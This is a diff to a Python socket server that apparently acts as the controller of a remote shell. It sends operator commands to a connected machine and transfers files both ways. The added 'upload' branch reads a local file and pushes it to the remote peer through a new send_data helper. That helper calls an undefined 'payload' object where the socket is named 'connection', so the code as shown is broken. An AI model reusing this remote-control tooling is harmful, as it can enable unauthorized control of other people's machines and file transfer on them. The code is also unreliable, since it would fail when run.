@@ -11,6 +11,12 @@ print("Server has started")
 
 connection, address = listener.accept()
 
+def send_data(ouput_data):
+    size_of_data = len(ouput_data)
+    size_of_data = str(size_of_data)
+    payload.send(bytes(size_of_data, "utf-8"))
+    payload.send(ouput_data)
+
 def recv_data():
     original_size = connection.recv(2048).decode("utf-8")
     original_size = int(original_size)
@@ -46,6 +52,13 @@ while True:
 			with open(f'{cmd[9:]}', 'wb') as write_data:
 				write_data.write(file_output)
 				write_data.close()
+			continue 
+
+		elif cmd[:6] == "upload":
+			with open(f'{cmd[7:]}', 'rb') as data:
+				file_data = data.read()
+				data.close()
+			send_data(file_data)
 			continue 
 			
 		connection.send(bytes(cmd, "utf-8"))
